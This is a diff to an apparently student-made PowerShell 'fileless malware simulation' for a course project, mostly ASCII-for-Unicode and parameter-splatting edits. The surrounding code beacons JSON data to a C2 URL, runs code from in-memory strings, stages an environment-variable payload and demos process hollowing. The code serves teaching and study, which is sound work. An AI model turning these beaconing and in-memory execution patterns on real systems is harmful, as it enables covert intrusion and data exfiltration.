@@ -52,10 +52,10 @@ $Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
 # ============================================
 function Show-Banner {
     Write-Host ""
-    Write-Host "╔══════════════════════════════════════════════════════════╗" -ForegroundColor Red
-    Write-Host "║     FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY       ║" -ForegroundColor Red
-    Write-Host "║          IT 359 Final Project - Hack the Blocks          ║" -ForegroundColor Red
-    Write-Host "╚══════════════════════════════════════════════════════════╝" -ForegroundColor Red
+    Write-Host "+----------------------------------------------------------+" -ForegroundColor Red
+    Write-Host "|     FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY       |" -ForegroundColor Red
+    Write-Host "|          IT 359 Final Project - Hack the Blocks          |" -ForegroundColor Red
+    Write-Host "+----------------------------------------------------------+" -ForegroundColor Red
     Write-Host ""
     Write-Host "[!] WARNING: This script is for authorized testing only!" -ForegroundColor Yellow
     Write-Host "[*] Session ID: $Global:UniqueId" -ForegroundColor Cyan
@@ -118,13 +118,16 @@ function Send-Beacon {
         }
         
         # Send HTTP POST request (data never touches disk)
-        $response = Invoke-RestMethod -Uri "$Global:C2Url$Endpoint" `
-                                      -Method POST `
-                                      -Body $jsonData `
-                                      -ContentType "application/json" `
-                                      -ErrorAction Stop
+        $requestParams = @{
+            Uri = "$Global:C2Url$Endpoint"
+            Method = "POST"
+            Body = $jsonData
+            ContentType = "application/json"
+            ErrorAction = "Stop"
+        }
+        $response = Invoke-RestMethod @requestParams
         
-        Write-Host "    [✓] Beacon sent successfully!" -ForegroundColor Green
+        Write-Host "    [OK] Beacon sent successfully!" -ForegroundColor Green
         return $response
     }
     catch {
@@ -135,8 +138,6 @@ function Send-Beacon {
     }
 }
 
-# End of Send-Beacon function
-
 # ============================================
 # TECHNIQUE 3: IN-MEMORY CODE EXECUTION
 # Execute code from string without file
@@ -146,15 +147,15 @@ function Invoke-MemoryExecution {
     
     # Code stored as string, executed via Invoke-Expression
     # This is how fileless malware often downloads and runs payloads
-    $inMemoryScript = @"
-    `$result = @{
+    $inMemoryScript = @'
+    $result = @{
         Technique = "In-Memory Execution"
-        ProcessId = `$PID
+        ProcessId = $PID
         ExecutionTime = Get-Date -Format "HH:mm:ss"
         Note = "This code was never written to disk"
     }
-    return `$result
-"@
+    return $result
+'@
     
     if ($DemoMode) {
         Write-Host "    [*] Executing script block from memory..." -ForegroundColor Gray
@@ -166,7 +167,7 @@ function Invoke-MemoryExecution {
     $result = & $scriptBlock
     
     if ($DemoMode) {
-        Write-Host "    [✓] In-memory execution completed (PID: $($result.ProcessId))" -ForegroundColor Green
+        Write-Host "    [OK] In-memory execution completed (PID: $($result.ProcessId))" -ForegroundColor Green
     }
     
     return $result
@@ -202,7 +203,7 @@ function Set-EnvPayload {
     
     # Clean up
     [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $null, "Process")
-    Write-Host "    [✓] Environment variable cleaned up" -ForegroundColor Green
+    Write-Host "    [OK] Environment variable cleaned up" -ForegroundColor Green
 }
 
 # ============================================
@@ -300,9 +301,9 @@ function Start-Simulation {
     Clear-Host
     Show-Banner
     
-    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
+    Write-Host "-----------------------------------------------------------" -ForegroundColor DarkGray
     Write-Host " DEMONSTRATING FILELESS MALWARE TECHNIQUES" -ForegroundColor White
-    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
+    Write-Host "-----------------------------------------------------------" -ForegroundColor DarkGray
     Write-Host ""
     
     # Technique 1: Gather recon data in memory
@@ -333,9 +334,9 @@ function Start-Simulation {
     Show-ProcessHollowing
     Write-Host ""
     
-    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
+    Write-Host "-----------------------------------------------------------" -ForegroundColor DarkGray
     Write-Host " SIMULATION COMPLETE" -ForegroundColor White
-    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
+    Write-Host "-----------------------------------------------------------" -ForegroundColor DarkGray
     Write-Host ""
     Write-Host "[*] All techniques demonstrated in memory - no files written!" -ForegroundColor Cyan
     Write-Host "[*] To start continuous beaconing, run: Start-BeaconLoop" -ForegroundColor Cyan
